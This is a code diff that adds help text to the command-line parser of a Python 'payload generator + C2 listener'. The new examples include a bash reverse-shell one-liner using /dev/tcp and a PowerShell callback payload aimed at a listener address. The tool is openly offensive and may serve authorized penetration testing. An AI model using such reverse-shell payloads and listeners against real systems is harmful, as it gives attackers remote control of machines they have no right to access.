@@ -788,7 +788,26 @@ def main():
     print("=== Payload Generator + Listener ===\n")
 
     # CLI parsing
-    parser = argparse.ArgumentParser(description="Payload generator + C2 listener")
+    parser = argparse.ArgumentParser(
+        description="Payload generator + C2 listener",
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog=(
+            "Examples:\n"
+            "  - Use built-ins or stored payloads and start listeners:\n"
+            "    ./main.py -m=b -os=l -con=tcp -lhost=127.0.0.1 -lport=4444\n"
+            "    ./main.py -m=b -os=w -con=http -lhost=10.0.0.5 -lport=2222\n"
+            "    Optional: -k=<payload_key> to auto-select.\n\n"
+            "  - Store a custom payload (host/port will be templated as {LHOST}/{LPORT}):\n"
+            "    ./main.py -m=c -os=l -con=tcp -lhost=127.0.0.1 -lport=5555 -n=mybash -pay='bash -i >& /dev/tcp/127.0.0.1/5555 0>&1'\n"
+            "    ./main.py -m=c -os=w -con=http -lhost=10.0.0.5 -lport=2222 -n=mypwsh -pay=\"powershell ... http://10.0.0.5:2222 ...\"\n\n"
+            "Notes:\n"
+            "- -os: l (Linux) or w (Windows)\n"
+            "- -con: tcp or http\n"
+            "- In -m=b, the opposite listener uses defaults (HTTP 2222, TCP 4444).\n"
+            "- Custom payloads are saved in payloads/custom_linux.json or payloads/custom_windows.json.\n"
+        ),
+    )
+    parser.add_argument("-help", action="help", help="Show this help message and exit")
     parser.add_argument("-m", "--mode", help="Mode: b = use/generate & listen, c = create/store payload")
     parser.add_argument("-os", "--os", dest="os_flag", help="Target OS: w = Windows, l = Linux")
     parser.add_argument("-con", "--connection", dest="connection", help="Connection type: http or tcp")
